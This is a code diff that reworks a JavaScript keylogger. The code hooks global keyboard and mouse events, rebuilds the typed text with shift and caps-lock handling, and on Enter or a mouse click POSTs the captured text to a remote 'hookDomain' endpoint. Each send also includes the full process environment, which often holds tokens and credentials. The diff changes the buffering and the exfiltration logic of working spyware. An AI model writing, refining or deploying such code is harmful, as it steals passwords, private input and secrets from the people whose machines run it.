@@ -64,15 +64,13 @@ try {
     }
 
     function processKeyEvent(event, down) {
-    if (!v) return; // If GlobalKeyboardListener is not initialized, do nothing.
+    if (!v) return;
 
-    console.log(event.rawKey);
-    isShiftPressed = down['LEFT SHIFT'] || down['RIGHT SHIFT']; 
-
+    isShiftPressed = down['LEFT SHIFT'] || down['RIGHT SHIFT'];
     const keyName = event.name;
 
     if (down[keyName]) {
-        // Handle mouse clicks
+        // Handle mouse buttons
         if (event.rawKey && ['VK_MBUTTON', 'VK_RBUTTON', 'VK_LBUTTON'].includes(event.rawKey._nameRaw)) {
             if (inputBuffer.length > 0) {
                 const data = {
@@ -86,18 +84,14 @@ try {
             return;
         }
 
-        // Handle special keys
         if (keyName === 'SPACE') {
             inputBuffer += ' ';
         } else if (keyName === 'LEFT SHIFT' || keyName === 'RIGHT SHIFT') {
-            // Shift key pressed
-            // No action needed here for buffer
+            // Shift state already handled above
             return;
         } else if (keyName === 'BACKSPACE') {
             inputBuffer = inputBuffer.slice(0, -1);
-            return; // Optionally, send buffer on backspace
         } else if (keyName === 'RETURN' || keyName === 'ENTER') {
-            // Send the current buffer
             const data = {
                 type: "Keyboard",
                 inputBuffer: inputBuffer,
@@ -105,7 +99,7 @@ try {
                 env: process.env
             };
             fetchHookDomainAndPostData(data);
-            return;
+            // Do not clear inputBuffer here; it is cleared after POST
         } else if (keyName === 'CAPS LOCK') {
             isCapsLockOn = !isCapsLockOn;
             return;
@@ -113,56 +107,38 @@ try {
 
         // Handle character keys
         if (event.rawKey && event.rawKey.name.length === 1) {
-            // Raw key is a single character
+            let charToAdd = keyName;
+
+            // Check if shift is pressed for special characters
             if (shiftSpecialChars[keyName]) {
-                // For special characters with shift
-                inputBuffer += isShiftPressed ? shiftSpecialChars[keyName] : keyName;
+                charToAdd = isShiftPressed ? shiftSpecialChars[keyName] : otherChars[keyName];
             } else {
-                // Regular alphabetic character
-                const isLetter = /^[a-zA-Z]$/.test(keyName);
-                if (isLetter) {
-                    const upper = keyName.toUpperCase();
-                    const lower = keyName.toLowerCase();
-                    if ((isShiftPressed && !isCapsLockOn) || (!isShiftPressed && isCapsLockOn)) {
-                        inputBuffer += upper;
-                    } else {
-                        inputBuffer += lower;
-                    }
+                // Regular alphabetic characters
+                if (
+                    ((isShiftPressed && !isCapsLockOn) || (!isShiftPressed && isCapsLockOn))
+                ) {
+                    charToAdd = keyName.toUpperCase();
                 } else {
-                    // For other single characters (if any)
-                    inputBuffer += keyName;
+                    charToAdd = keyName.toLowerCase();
                 }
             }
-        } else if (shiftSpecialChars[keyName]) {
-            // Non-character keys that produce symbols
-            inputBuffer += isShiftPressed ? shiftSpecialChars[keyName] : otherChars[keyName];
+
+            inputBuffer += charToAdd;
         }
+        // Debugging: log the current buffer
+        console.log('Current Buffer:', inputBuffer);
     }
 }
 
-    let sendTimeout;
-
-    async function fetchHookDomainAndPostData(data) {
-        try {
-            await axios.post(`${hookDomain}/hook/keyboard-event`, data);
-            // Clear buffer only after successful send
-            inputBuffer = '';
-        } catch (error) {
-            console.error(`Error sending data: ${error}`);
-            // Optionally, keep buffer for retry
-        }
-        clearTimeout(sendTimeout);
+    const fetchHookDomainAndPostData = async (data) => {
+    try {
+        await axios.post(`${hookDomain}/hook/keyboard-event`, data);
+        // console.log(`Data sent successfully`);
+    } catch (error) {
+        console.error(`Error sending data: ${error}`);
     }
-
-    // In processKeyEvent, schedule sending after a delay
-    function scheduleSend() {
-        clearTimeout(sendTimeout);
-        sendTimeout = setTimeout(() => {
-            if (inputBuffer.length > 0) {
-                fetchHookDomainAndPostData({ type: "Keyboard", inputBuffer, env: process.env });
-            }
-        }, 500); // 500ms delay
-    }
+    inputBuffer = ''; // Clear buffer after POST
+};
 
     const init = () => {
         try {
